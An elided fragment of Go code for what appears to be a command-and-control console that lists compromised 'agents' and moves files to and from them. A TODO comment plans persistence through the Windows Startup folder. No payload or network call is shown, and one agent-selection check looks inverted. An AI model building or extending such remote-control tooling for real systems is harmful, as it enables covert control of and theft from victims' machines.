...
// TODO
// - Implement Persistence - C:\Users\<user-name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
...
func showAgents(separatedCommand []string) {
	...
	for _, agents := range activeAgents {
		fmt.Println("=> AgentId: " + agents.AgentId + " | Hostname: " + agents.AgentHostname + " | Active:", agents.AgentActive)
	}
...
func uploadFile(separatedCommand []string) {
	...
	if selectedAgentId != "" {
		...
		fmt.Println("[-] Select and agent to upload the file: select <agent_id>")
	}
}
...
func downloadFile(separatedCommand []string) {
	...
	if selectedAgentId != "" {
		...
		fmt.Println("[-] Select and agent to download the file: select <agent_id>")
	}
